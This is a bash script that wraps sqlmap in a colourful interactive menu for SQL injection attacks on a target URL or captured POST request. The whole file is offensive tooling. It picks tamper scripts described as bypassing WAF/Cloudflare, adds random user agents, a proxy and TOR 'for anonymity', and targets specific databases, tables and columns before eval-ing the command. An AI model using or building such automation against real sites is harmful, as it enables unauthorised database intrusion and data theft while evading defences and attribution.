#!/bin/bash

# Colors for professional and colorful UI
RED="\033[1;31m"
GREEN="\033[1;32m"
CYAN="\033[1;36m"
YELLOW="\033[1;33m"
MAGENTA="\033[1;35m"
BLUE="\033[1;34m"
BOLD="\033[1m"
RESET="\033[0m"

# Display a colorful banner
function display_banner() {
    echo -e "${MAGENTA}"
    echo "╔════════════════════════════════════════════════════════════════╗"
    echo "║            ${CYAN}${BOLD}Advanced SQLMap Automation Script${MAGENTA}                    ║"
    echo "║                     ${YELLOW}Created by Shaid Mahamud${MAGENTA}                       ║"
    echo "║           ${GREEN}Professional, User-Friendly, and Colorful${MAGENTA}                ║"
    echo "╚════════════════════════════════════════════════════════════════╝"
    echo -e "${RESET}"
}

# Display the banner
display_banner

# Create a log file
LOG_FILE="sqlmap_automation_$(date +%Y%m%d%H%M%S).log"
touch "$LOG_FILE"
echo -e "${BLUE}[INFO] Logging all activities to: ${YELLOW}$LOG_FILE${RESET}"

# Prompt for request type
echo -e "${CYAN}➤ ${GREEN}Choose Request Type:${RESET}"
echo -e "  ${YELLOW}1.${RESET} GET Request"
echo -e "  ${YELLOW}2.${RESET} POST Request"
read -p "$(echo -e "${MAGENTA}Enter your choice (1 or 2): ${RESET}")" REQUEST_TYPE

# Validate input
if [[ $REQUEST_TYPE -ne 1 && $REQUEST_TYPE -ne 2 ]]; then
    echo -e "${RED}[ERROR] Invalid choice. Exiting...${RESET}"
    exit 1
fi

# Input target details
if [[ $REQUEST_TYPE -eq 1 ]]; then
    read -p "$(echo -e "${MAGENTA}Enter the target URL: ${RESET}")" TARGET
    SQLMAP_CMD="sqlmap -u \"$TARGET\""
else
    read -p "$(echo -e "${MAGENTA}Enter the path to the POST request file (e.g., request.txt): ${RESET}")" TARGET
    SQLMAP_CMD="sqlmap -r \"$TARGET\""
fi

# Prompt for advanced features
echo -e "${CYAN}➤ ${GREEN}Enable Advanced Features?${RESET}"
echo -e "  ${YELLOW}1.${RESET} Yes"
echo -e "  ${YELLOW}2.${RESET} No (Basic mode)"
read -p "$(echo -e "${MAGENTA}Enter your choice (1 or 2): ${RESET}")" ADVANCED

# Add tamper scripts (if chosen)
if [[ $ADVANCED -eq 1 ]]; then
    echo -e "${CYAN}➤ ${GREEN}Select Tamper Scripts to Bypass WAF/Cloudflare:${RESET}"
    echo -e "  ${YELLOW}1.${RESET} space2comment (Spaces to comments)"
    echo -e "  ${YELLOW}2.${RESET} charunicodeencode (Encode payload to Unicode)"
    echo -e "  ${YELLOW}3.${RESET} between (Use BETWEEN operator)"
    echo -e "  ${YELLOW}4.${RESET} hexencode (Encode strings to Hexadecimal)"
    echo -e "  ${YELLOW}5.${RESET} Use All Tamper Scripts"
    read -p "$(echo -e "${MAGENTA}Enter your choice (1-5): ${RESET}")" TAMPER_CHOICE

    case $TAMPER_CHOICE in
    1) TAMPER="space2comment" ;;
    2) TAMPER="charunicodeencode" ;;
    3) TAMPER="between" ;;
    4) TAMPER="hexencode" ;;
    5) TAMPER="space2comment,charunicodeencode,between,hexencode" ;;
    *)
        echo -e "${RED}[ERROR] Invalid tamper script choice. Exiting...${RESET}"
        exit 1
        ;;
    esac
    SQLMAP_CMD+=" --tamper=$TAMPER"
fi

# Add additional advanced options
if [[ $ADVANCED -eq 1 ]]; then
    SQLMAP_CMD+=" --random-agent --delay=2 --timeout=10 --retries=5"
    echo -e "${YELLOW}[INFO] Advanced mode activated with delay, retries, and WAF bypass.${RESET}"
fi

# Ask for database, table, and column details
read -p "$(echo -e "${CYAN}Enter the database name (if known, leave blank otherwise): ${RESET}")" DB_NAME
read -p "$(echo -e "${CYAN}Enter the table name (if known, leave blank otherwise): ${RESET}")" TABLE_NAME
read -p "$(echo -e "${CYAN}Enter the column name(s) (comma-separated, leave blank otherwise): ${RESET}")" COLUMN_NAMES

# Add database, table, and column-specific options
if [[ -n $DB_NAME ]]; then
    SQLMAP_CMD+=" -D \"$DB_NAME\""
fi
if [[ -n $TABLE_NAME ]]; then
    SQLMAP_CMD+=" -T \"$TABLE_NAME\""
fi
if [[ -n $COLUMN_NAMES ]]; then
    SQLMAP_CMD+=" -C \"$COLUMN_NAMES\""
fi

# Enable proxy support
echo -e "${CYAN}➤ ${GREEN}Would you like to use a proxy for the attack?${RESET}"
echo -e "  ${YELLOW}1.${RESET} Yes"
echo -e "  ${YELLOW}2.${RESET} No"
read -p "$(echo -e "${MAGENTA}Enter your choice (1 or 2): ${RESET}")" PROXY_CHOICE
if [[ $PROXY_CHOICE -eq 1 ]]; then
    read -p "$(echo -e "${MAGENTA}Enter the proxy URL (e.g., http://127.0.0.1:8080): ${RESET}")" PROXY_URL
    SQLMAP_CMD+=" --proxy=\"$PROXY_URL\""
    echo -e "${YELLOW}[INFO] Proxy enabled.${RESET}"
fi

# Enable TOR for anonymity
echo -e "${CYAN}➤ ${GREEN}Would you like to use TOR for anonymity?${RESET}"
echo -e "  ${YELLOW}1.${RESET} Yes"
echo -e "  ${YELLOW}2.${RESET} No"
read -p "$(echo -e "${MAGENTA}Enter your choice (1 or 2): ${RESET}")" TOR_CHOICE
if [[ $TOR_CHOICE -eq 1 ]]; then
    SQLMAP_CMD+=" --tor --tor-type=SOCKS5 --check-tor"
    echo -e "${YELLOW}[INFO] TOR enabled.${RESET}"
fi

# Display final command for confirmation
echo -e "${CYAN}➤ ${GREEN}Generated SQLMap Command:${RESET}"
echo -e "${MAGENTA}$SQLMAP_CMD${RESET}"

# Ask for confirmation to execute the command
read -p "$(echo -e "${MAGENTA}Do you want to execute this command? (y/n): ${RESET}")" EXECUTE
if [[ $EXECUTE == "y" || $EXECUTE == "Y" ]]; then
    echo -e "${CYAN}[INFO] Executing the command...${RESET}"
    eval "$SQLMAP_CMD" | tee -a "$LOG_FILE"
    echo -e "${GREEN}[SUCCESS] Execution complete. Check the log file: $LOG_FILE${RESET}"
else
    echo -e "${RED}[INFO] Execution canceled by the user.${RESET}"
fi

# End of script
echo -e "${MAGENTA}Thank you for using the Advanced SQLMap Automation Script!${RESET}"
